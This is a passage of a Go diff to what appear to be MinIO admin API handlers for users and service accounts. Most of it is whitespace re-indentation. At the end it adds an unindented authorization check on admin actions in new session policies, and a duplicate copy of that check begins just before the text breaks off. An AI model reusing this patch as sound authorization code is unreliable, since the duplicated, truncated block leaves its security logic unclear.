{\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n-\t\treturn\n-\t}\n-\n-\tif r.ContentLength > maxEConfigJSONSize || r.ContentLength == -1 {\n-\t\t// More than maxConfigSize bytes were available\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminConfigTooLarge), r.URL)\n-\t\treturn\n-\t}\n-\n-\tpassword := cred.SecretKey\n-\tconfigBytes, err := madmin.DecryptData(password, io.LimitReader(r.Body, r.ContentLength))\n-\tif err != nil {\n-\t\tlogger.LogIf(ctx, err)\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminConfigBadJSON), r.URL)\n-\t\treturn\n-\t}\n-\n-\tvar ureq madmin.AddOrUpdateUserReq\n-\tif err = json.Unmarshal(configBytes, &ureq); err != nil {\n-\t\tlogger.LogIf(ctx, err)\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminConfigBadJSON), r.URL)\n-\t\treturn\n-\t}\n-\n-\tupdatedAt, err := globalIAMSys.CreateUser(ctx, accessKey, ureq)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\tType: madmin.SRIAMItemIAMUser,\n-\t\tIAMUser: &madmin.SRIAMUser{\n-\t\t\tAccessKey:   accessKey,\n-\t\t\tIsDeleteReq: false,\n-\t\t\tUserReq:     &ureq,\n-\t\t},\n-\t\tUpdatedAt: updatedAt,\n-\t}))\n+        ctx := r.Context()\n+\n+        vars := mux.Vars(r)\n+        accessKey := vars[\"accessKey\"]\n+\n+        // Get current object layer instance.\n+        objectAPI := newObjectLayerFn()\n+        if objectAPI == nil || globalNotificationSys == nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n+                return\n+        }\n+\n+        cred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n+        if s3Err != ErrNone {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n+                return\n+        }\n+\n+        // Not allowed to add a user with same access key as root credential\n+        if accessKey == globalActiveCred.AccessKey {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAddUserInvalidArgument), r.URL)\n+                return\n+        }\n+\n+        user, exists := globalIAMSys.GetUser(ctx, accessKey)\n+        if exists && (user.Credentials.IsTemp() || user.Credentials.IsServiceAccount()) {\n+                // Updating STS credential is not allowed, and this API does not\n+                // support updating service accounts.\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAddUserInvalidArgument), r.URL)\n+                return\n+        }\n+\n+        if (cred.IsTemp() || cred.IsServiceAccount()) && cred.ParentUser == accessKey {\n+                // Incoming access key matches parent user then we should\n+                // reject password change requests.\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAddUserInvalidArgument), r.URL)\n+                return\n+        }\n+\n+        // Check if accessKey has beginning and end space characters, this only applies to new users.\n+        if !exists && hasSpaceBE(accessKey) {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument), r.URL)\n+                return\n+        }\n+\n+        checkDenyOnly := false\n+        if accessKey == cred.AccessKey {\n+                // Check that there is no explicit deny - otherwise it's allowed\n+                // to change one's own password.\n+                checkDenyOnly = true\n+        }\n+\n+        if !globalIAMSys.IsAllowed(policy.Args{\n+                AccountName:     cred.AccessKey,\n+                Groups:          cred.Groups,\n+                Action:          policy.CreateUserAdminAction,\n+                ConditionValues: getConditionValues(r, \"\", cred),\n+                IsOwner:         owner,\n+                Claims:          cred.Claims,\n+                DenyOnly:        checkDenyOnly,\n+        }) {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+                return\n+        }\n+\n+        if r.ContentLength > maxEConfigJSONSize || r.ContentLength == -1 {\n+                // More than maxConfigSize bytes were available\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminConfigTooLarge), r.URL)\n+                return\n+        }\n+\n+        password := cred.SecretKey\n+        configBytes, err := madmin.DecryptData(password, io.LimitReader(r.Body, r.ContentLength))\n+        if err != nil {\n+                logger.LogIf(ctx, err)\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminConfigBadJSON), r.URL)\n+                return\n+        }\n+\n+        var ureq madmin.AddOrUpdateUserReq\n+        if err = json.Unmarshal(configBytes, &ureq); err != nil {\n+                logger.LogIf(ctx, err)\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminConfigBadJSON), r.URL)\n+                return\n+        }\n+\n+        updatedAt, err := globalIAMSys.CreateUser(ctx, accessKey, ureq)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                Type: madmin.SRIAMItemIAMUser,\n+                IAMUser: &madmin.SRIAMUser{\n+                        AccessKey:   accessKey,\n+                        IsDeleteReq: false,\n+                        UserReq:     &ureq,\n+                },\n+                UpdatedAt: updatedAt,\n+        }))\n }\n \n // TemporaryAccountInfo - GET /minio/admin/v3/temporary-account-info\n func (a adminAPIHandlers) TemporaryAccountInfo(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\t// Get current object layer instance.\n-\tobjectAPI := newObjectLayerFn()\n-\tif objectAPI == nil || globalNotificationSys == nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n-\tif s3Err != ErrNone {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n-\t\treturn\n-\t}\n-\n-\taccessKey := mux.Vars(r)[\"accessKey\"]\n-\tif accessKey == \"\" {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n-\t\treturn\n-\t}\n-\n-\targs := policy.Args{\n-\t\tAccountName:     cred.AccessKey,\n-\t\tGroups:          cred.Groups,\n-\t\tAction:          policy.ListTemporaryAccountsAdminAction,\n-\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\tIsOwner:         owner,\n-\t\tClaims:          cred.Claims,\n-\t}\n-\n-\tif !globalIAMSys.IsAllowed(args) {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n-\t\treturn\n-\t}\n-\n-\tstsAccount, sessionPolicy, err := globalIAMSys.GetTemporaryAccount(ctx, accessKey)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tvar stsAccountPolicy policy.Policy\n-\n-\tif sessionPolicy != nil {\n-\t\tstsAccountPolicy = *sessionPolicy\n-\t} else {\n-\t\tpoliciesNames, err := globalIAMSys.PolicyDBGet(stsAccount.ParentUser, stsAccount.Groups...)\n-\t\tif err != nil {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\tif len(policiesNames) == 0 {\n-\t\t\tpolicySet, _ := args.GetPolicies(iamPolicyClaimNameOpenID())\n-\t\t\tpoliciesNames = policySet.ToSlice()\n-\t\t}\n-\n-\t\tstsAccountPolicy = globalIAMSys.GetCombinedPolicy(policiesNames...)\n-\t}\n-\n-\tpolicyJSON, err := json.MarshalIndent(stsAccountPolicy, \"\", \" \")\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tinfoResp := madmin.TemporaryAccountInfoResp{\n-\t\tParentUser:    stsAccount.ParentUser,\n-\t\tAccountStatus: stsAccount.Status,\n-\t\tImpliedPolicy: sessionPolicy == nil,\n-\t\tPolicy:        string(policyJSON),\n-\t\tExpiration:    &stsAccount.Expiration,\n-\t}\n-\n-\tdata, err := json.Marshal(infoResp)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tencryptedData, err := madmin.EncryptData(cred.SecretKey, data)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\twriteSuccessResponseJSON(w, encryptedData)\n+        ctx := r.Context()\n+\n+        // Get current object layer instance.\n+        objectAPI := newObjectLayerFn()\n+        if objectAPI == nil || globalNotificationSys == nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n+                return\n+        }\n+\n+        cred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n+        if s3Err != ErrNone {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n+                return\n+        }\n+\n+        accessKey := mux.Vars(r)[\"accessKey\"]\n+        if accessKey == \"\" {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n+                return\n+        }\n+\n+        args := policy.Args{\n+                AccountName:     cred.AccessKey,\n+                Groups:          cred.Groups,\n+                Action:          policy.ListTemporaryAccountsAdminAction,\n+                ConditionValues: getConditionValues(r, \"\", cred),\n+                IsOwner:         owner,\n+                Claims:          cred.Claims,\n+        }\n+\n+        if !globalIAMSys.IsAllowed(args) {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+                return\n+        }\n+\n+        stsAccount, sessionPolicy, err := globalIAMSys.GetTemporaryAccount(ctx, accessKey)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        var stsAccountPolicy policy.Policy\n+\n+        if sessionPolicy != nil {\n+                stsAccountPolicy = *sessionPolicy\n+        } else {\n+                policiesNames, err := globalIAMSys.PolicyDBGet(stsAccount.ParentUser, stsAccount.Groups...)\n+                if err != nil {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+                if len(policiesNames) == 0 {\n+                        policySet, _ := args.GetPolicies(iamPolicyClaimNameOpenID())\n+                        policiesNames = policySet.ToSlice()\n+                }\n+\n+                stsAccountPolicy = globalIAMSys.GetCombinedPolicy(policiesNames...)\n+        }\n+\n+        policyJSON, err := json.MarshalIndent(stsAccountPolicy, \"\", \" \")\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        infoResp := madmin.TemporaryAccountInfoResp{\n+                ParentUser:    stsAccount.ParentUser,\n+                AccountStatus: stsAccount.Status,\n+                ImpliedPolicy: sessionPolicy == nil,\n+                Policy:        string(policyJSON),\n+                Expiration:    &stsAccount.Expiration,\n+        }\n+\n+        data, err := json.Marshal(infoResp)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        encryptedData, err := madmin.EncryptData(cred.SecretKey, data)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        writeSuccessResponseJSON(w, encryptedData)\n }\n \n // AddServiceAccount - PUT /minio/admin/v3/add-service-account\n func (a adminAPIHandlers) AddServiceAccount(w http.ResponseWriter, r *http.Request) {\n-\tctx, cred, opts, createReq, targetUser, APIError := commonAddServiceAccount(r)\n-\tif APIError.Code != \"\" {\n-\t\twriteErrorResponseJSON(ctx, w, APIError, r.URL)\n-\t\treturn\n-\t}\n-\n-\tvar (\n-\t\ttargetGroups []string\n-\t\terr          error\n-\t)\n-\n-\t// Find the user for the request sender (as it may be sent via a service\n-\t// account or STS account):\n-\trequestorUser := cred.AccessKey\n-\trequestorParentUser := cred.AccessKey\n-\trequestorGroups := cred.Groups\n-\trequestorIsDerivedCredential := false\n-\tif cred.IsServiceAccount() || cred.IsTemp() {\n-\t\trequestorParentUser = cred.ParentUser\n-\t\trequestorIsDerivedCredential = true\n-\t}\n-\n-\tif globalIAMSys.GetUsersSysType() == MinIOUsersSysType && targetUser != cred.AccessKey {\n-\t\t// For internal IDP, ensure that the targetUser's parent account exists.\n-\t\t// It could be a regular user account or the root account.\n-\t\t_, isRegularUser := globalIAMSys.GetUser(ctx, targetUser)\n-\t\tif !isRegularUser && targetUser != globalActiveCred.AccessKey {\n-\t\t\tapiErr := toAdminAPIErr(ctx, errNoSuchUser)\n-\t\t\tapiErr.Description = fmt.Sprintf(\"Specified target user %s does not exist\", targetUser)\n-\t\t\twriteErrorResponseJSON(ctx, w, apiErr, r.URL)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\t// Check if we are creating svc account for request sender.\n-\tisSvcAccForRequestor := false\n-\tif targetUser == requestorUser || targetUser == requestorParentUser {\n-\t\tisSvcAccForRequestor = true\n-\t}\n-\n-\t// If we are creating svc account for request sender, ensure\n-\t// that targetUser is a real user (i.e. not derived\n-\t// credentials).\n-\tif isSvcAccForRequestor {\n-\t\tif requestorIsDerivedCredential {\n-\t\t\tif requestorParentUser == \"\" {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx,\n-\t\t\t\t\terrors.New(\"service accounts cannot be generated for temporary credentials without parent\")), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\ttargetUser = requestorParentUser\n-\t\t}\n-\t\ttargetGroups = requestorGroups\n-\n-\t\t// In case of LDAP/OIDC we need to set `opts.claims` to ensure\n-\t\t// it is associated with the LDAP/OIDC user properly.\n-\t\tfor k, v := range cred.Claims {\n-\t\t\tif k == expClaim {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\topts.claims[k] = v\n-\t\t}\n-\t} else if globalIAMSys.LDAPConfig.Enabled() {\n-\t\t// In case of LDAP we need to resolve the targetUser to a DN and\n-\t\t// query their groups:\n-\t\topts.claims[ldapUserN] = targetUser // simple username\n-\t\ttargetUser, targetGroups, err = globalIAMSys.LDAPConfig.LookupUserDN(targetUser)\n-\t\tif err != nil {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\topts.claims[ldapUser] = targetUser // username DN\n-\n-\t\t// NOTE: if not using LDAP, then internal IDP or open ID is\n-\t\t// being used - in the former, group info is enforced when\n-\t\t// generated credentials are used to make requests, and in the\n-\t\t// latter, a group notion is not supported.\n-\t}\n-\n-\tnewCred, updatedAt, err := globalIAMSys.NewServiceAccount(ctx, targetUser, targetGroups, opts)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcreateResp := madmin.AddServiceAccountResp{\n-\t\tCredentials: madmin.Credentials{\n-\t\t\tAccessKey:  newCred.AccessKey,\n-\t\t\tSecretKey:  newCred.SecretKey,\n-\t\t\tExpiration: newCred.Expiration,\n-\t\t},\n-\t}\n-\n-\tdata, err := json.Marshal(createResp)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tencryptedData, err := madmin.EncryptData(cred.SecretKey, data)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\twriteSuccessResponseJSON(w, encryptedData)\n-\n-\t// Call hook for cluster-replication if the service account is not for a\n-\t// root user.\n-\tif newCred.ParentUser != globalActiveCred.AccessKey {\n-\t\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\t\tType: madmin.SRIAMItemSvcAcc,\n-\t\t\tSvcAccChange: &madmin.SRSvcAccChange{\n-\t\t\t\tCreate: &madmin.SRSvcAccCreate{\n-\t\t\t\t\tParent:        newCred.ParentUser,\n-\t\t\t\t\tAccessKey:     newCred.AccessKey,\n-\t\t\t\t\tSecretKey:     newCred.SecretKey,\n-\t\t\t\t\tGroups:        newCred.Groups,\n-\t\t\t\t\tName:          newCred.Name,\n-\t\t\t\t\tDescription:   newCred.Description,\n-\t\t\t\t\tClaims:        opts.claims,\n-\t\t\t\t\tSessionPolicy: createReq.Policy,\n-\t\t\t\t\tStatus:        auth.AccountOn,\n-\t\t\t\t\tExpiration:    createReq.Expiration,\n-\t\t\t\t},\n-\t\t\t},\n-\t\t\tUpdatedAt: updatedAt,\n-\t\t}))\n-\t}\n+        ctx, cred, opts, createReq, targetUser, APIError := commonAddServiceAccount(r)\n+        if APIError.Code != \"\" {\n+                writeErrorResponseJSON(ctx, w, APIError, r.URL)\n+                return\n+        }\n+\n+        var (\n+                targetGroups []string\n+                err          error\n+        )\n+\n+        // Find the user for the request sender (as it may be sent via a service\n+        // account or STS account):\n+        requestorUser := cred.AccessKey\n+        requestorParentUser := cred.AccessKey\n+        requestorGroups := cred.Groups\n+        requestorIsDerivedCredential := false\n+        if cred.IsServiceAccount() || cred.IsTemp() {\n+                requestorParentUser = cred.ParentUser\n+                requestorIsDerivedCredential = true\n+        }\n+\n+        if globalIAMSys.GetUsersSysType() == MinIOUsersSysType && targetUser != cred.AccessKey {\n+                // For internal IDP, ensure that the targetUser's parent account exists.\n+                // It could be a regular user account or the root account.\n+                _, isRegularUser := globalIAMSys.GetUser(ctx, targetUser)\n+                if !isRegularUser && targetUser != globalActiveCred.AccessKey {\n+                        apiErr := toAdminAPIErr(ctx, errNoSuchUser)\n+                        apiErr.Description = fmt.Sprintf(\"Specified target user %s does not exist\", targetUser)\n+                        writeErrorResponseJSON(ctx, w, apiErr, r.URL)\n+                        return\n+                }\n+        }\n+\n+        // Check if we are creating svc account for request sender.\n+        isSvcAccForRequestor := false\n+        if targetUser == requestorUser || targetUser == requestorParentUser {\n+                isSvcAccForRequestor = true\n+        }\n+\n+        // If we are creating svc account for request sender, ensure\n+        // that targetUser is a real user (i.e. not derived\n+        // credentials).\n+        if isSvcAccForRequestor {\n+                if requestorIsDerivedCredential {\n+                        if requestorParentUser == \"\" {\n+                                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx,\n+                                        errors.New(\"service accounts cannot be generated for temporary credentials without parent\")), r.URL)\n+                                return\n+                        }\n+                        targetUser = requestorParentUser\n+                }\n+                targetGroups = requestorGroups\n+\n+                // In case of LDAP/OIDC we need to set `opts.claims` to ensure\n+                // it is associated with the LDAP/OIDC user properly.\n+                for k, v := range cred.Claims {\n+                        if k == expClaim {\n+                                continue\n+                        }\n+                        opts.claims[k] = v\n+                }\n+        } else if globalIAMSys.LDAPConfig.Enabled() {\n+                // In case of LDAP we need to resolve the targetUser to a DN and\n+                // query their groups:\n+                opts.claims[ldapUserN] = targetUser // simple username\n+                targetUser, targetGroups, err = globalIAMSys.LDAPConfig.LookupUserDN(targetUser)\n+                if err != nil {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+                opts.claims[ldapUser] = targetUser // username DN\n+\n+                // NOTE: if not using LDAP, then internal IDP or open ID is\n+                // being used - in the former, group info is enforced when\n+                // generated credentials are used to make requests, and in the\n+                // latter, a group notion is not supported.\n+        }\n+\n+        newCred, updatedAt, err := globalIAMSys.NewServiceAccount(ctx, targetUser, targetGroups, opts)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        createResp := madmin.AddServiceAccountResp{\n+                Credentials: madmin.Credentials{\n+                        AccessKey:  newCred.AccessKey,\n+                        SecretKey:  newCred.SecretKey,\n+                        Expiration: newCred.Expiration,\n+                },\n+        }\n+\n+        data, err := json.Marshal(createResp)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        encryptedData, err := madmin.EncryptData(cred.SecretKey, data)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        writeSuccessResponseJSON(w, encryptedData)\n+\n+        // Call hook for cluster-replication if the service account is not for a\n+        // root user.\n+        if newCred.ParentUser != globalActiveCred.AccessKey {\n+                logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                        Type: madmin.SRIAMItemSvcAcc,\n+                        SvcAccChange: &madmin.SRSvcAccChange{\n+                                Create: &madmin.SRSvcAccCreate{\n+                                        Parent:        newCred.ParentUser,\n+                                        AccessKey:     newCred.AccessKey,\n+                                        SecretKey:     newCred.SecretKey,\n+                                        Groups:        newCred.Groups,\n+                                        Name:          newCred.Name,\n+                                        Description:   newCred.Description,\n+                                        Claims:        opts.claims,\n+                                        SessionPolicy: createReq.Policy,\n+                                        Status:        auth.AccountOn,\n+                                        Expiration:    createReq.Expiration,\n+                                },\n+                        },\n+                        UpdatedAt: updatedAt,\n+                }))\n+        }\n }\n \n // UpdateServiceAccount - POST /minio/admin/v3/update-service-account\n func (a adminAPIHandlers) UpdateServiceAccount(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\t// Get current object layer instance.\n-\tobjectAPI := newObjectLayerFn()\n-\tif objectAPI == nil || globalNotificationSys == nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n-\tif s3Err != ErrNone {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n-\t\treturn\n-\t}\n-\n-\taccessKey := mux.Vars(r)[\"accessKey\"]\n-\tif accessKey == \"\" {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n-\t\treturn\n-\t}\n-\n-\tsvcAccount, _, err := globalIAMSys.GetServiceAccount(ctx, accessKey)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tif !globalIAMSys.IsAllowed(policy.Args{\n-\t\tAccountName:     cred.AccessKey,\n-\t\tGroups:          cred.Groups,\n-\t\tAction:          policy.UpdateServiceAccountAdminAction,\n-\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\tIsOwner:         owner,\n-\t\tClaims:          cred.Claims,\n-\t}) {\n-\t\trequestUser := cred.AccessKey\n-\t\tif cred.ParentUser != \"\" {\n-\t\t\trequestUser = cred.ParentUser\n-\t\t}\n-\n-\t\tif requestUser != svcAccount.ParentUser {\n-\t\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\tpassword := cred.SecretKey\n-\treqBytes, err := madmin.DecryptData(password, io.LimitReader(r.Body, r.ContentLength))\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErrWithErr(ErrAdminConfigBadJSON, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tvar updateReq madmin.UpdateServiceAccountReq\n-\tif err = json.Unmarshal(reqBytes, &updateReq); err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErrWithErr(ErrAdminConfigBadJSON, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tif err := updateReq.Validate(); err != nil {\n-\t\t// Since this validation would happen client side as well, we only send\n-\t\t// a generic error message here.\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument), r.URL)\n-\t\treturn\n-\t}\n-\n-\tvar sp *policy.Policy\n-\tif len(updateReq.NewPolicy) > 0 {\n-\t\tsp, err = policy.ParseConfig(bytes.NewReader(updateReq.NewPolicy))\n-\t\tif err != nil {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\tif sp.Version == \"\" && len(sp.Statements) == 0 {\n-\t\t\tsp = nil\n-\t\t}\n-\t}\n-\topts := updateServiceAccountOpts{\n-\t\tsecretKey:     updateReq.NewSecretKey,\n-\t\tstatus:        updateReq.NewStatus,\n-\t\tname:          updateReq.NewName,\n-\t\tdescription:   updateReq.NewDescription,\n-\t\texpiration:    updateReq.NewExpiration,\n-\t\tsessionPolicy: sp,\n-\t}\n-\tupdatedAt, err := globalIAMSys.UpdateServiceAccount(ctx, accessKey, opts)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Call site replication hook - non-root user accounts are replicated.\n-\tif svcAccount.ParentUser != globalActiveCred.AccessKey {\n-\t\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\t\tType: madmin.SRIAMItemSvcAcc,\n-\t\t\tSvcAccChange: &madmin.SRSvcAccChange{\n-\t\t\t\tUpdate: &madmin.SRSvcAccUpdate{\n-\t\t\t\t\tAccessKey:     accessKey,\n-\t\t\t\t\tSecretKey:     opts.secretKey,\n-\t\t\t\t\tStatus:        opts.status,\n-\t\t\t\t\tName:          opts.name,\n-\t\t\t\t\tDescription:   opts.description,\n-\t\t\t\t\tSessionPolicy: updateReq.NewPolicy,\n-\t\t\t\t\tExpiration:    updateReq.NewExpiration,\n-\t\t\t\t},\n-\t\t\t},\n-\t\t\tUpdatedAt: updatedAt,\n-\t\t}))\n-\t}\n-\n-\twriteSuccessNoContent(w)\n+        ctx := r.Context()\n+\n+        // Get current object layer instance.\n+        objectAPI := newObjectLayerFn()\n+        if objectAPI == nil || globalNotificationSys == nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n+                return\n+        }\n+\n+        cred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n+        if s3Err != ErrNone {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n+                return\n+        }\n+\n+        accessKey := mux.Vars(r)[\"accessKey\"]\n+        if accessKey == \"\" {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n+                return\n+        }\n+\n+        svcAccount, _, err := globalIAMSys.GetServiceAccount(ctx, accessKey)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        if !globalIAMSys.IsAllowed(policy.Args{\n+                AccountName:     cred.AccessKey,\n+                Groups:          cred.Groups,\n+                Action:          policy.UpdateServiceAccountAdminAction,\n+                ConditionValues: getConditionValues(r, \"\", cred),\n+                IsOwner:         owner,\n+                Claims:          cred.Claims,\n+        }) {\n+                requestUser := cred.AccessKey\n+                if cred.ParentUser != \"\" {\n+                        requestUser = cred.ParentUser\n+                }\n+\n+                if requestUser != svcAccount.ParentUser {\n+                        writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+                        return\n+                }\n+        }\n+\n+        password := cred.SecretKey\n+        reqBytes, err := madmin.DecryptData(password, io.LimitReader(r.Body, r.ContentLength))\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErrWithErr(ErrAdminConfigBadJSON, err), r.URL)\n+                return\n+        }\n+\n+        var updateReq madmin.UpdateServiceAccountReq\n+        if err = json.Unmarshal(reqBytes, &updateReq); err != nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErrWithErr(ErrAdminConfigBadJSON, err), r.URL)\n+                return\n+        }\n+\n+        if err := updateReq.Validate(); err != nil {\n+                // Since this validation would happen client side as well, we only send\n+                // a generic error message here.\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument), r.URL)\n+                return\n+        }\n+\n+        var sp *policy.Policy\n+        if len(updateReq.NewPolicy) > 0 {\n+                sp, err = policy.ParseConfig(bytes.NewReader(updateReq.NewPolicy))\n+                if err != nil {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+                if sp.Version == \"\" && len(sp.Statements) == 0 {\n+                        sp = nil\n+                }\n+        }\n+\n+if sp != nil {\n+for _, st := range sp.Statements {\n+for action := range st.Actions {\n+if policy.Action(action).IsAdminAction() {\n+if !globalIAMSys.IsAllowed(policy.Args{\n+AccountName:     cred.AccessKey,\n+Groups:          cred.Groups,\n+Action:          policy.Action(action),\n+ConditionValues: getConditionValues(r, \"\", cred),\n+IsOwner:         owner,\n+Claims:          cred.Claims,\n+}) {\n+writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+return\n+}\n+}\n+}\n+}\n+}\n+\n+\n+if sp != nil {\n+for _, st := range sp.Statements {\n+for action := range st.Actions {\n+if policy.Action(action).IsAdminAction() {\n+if 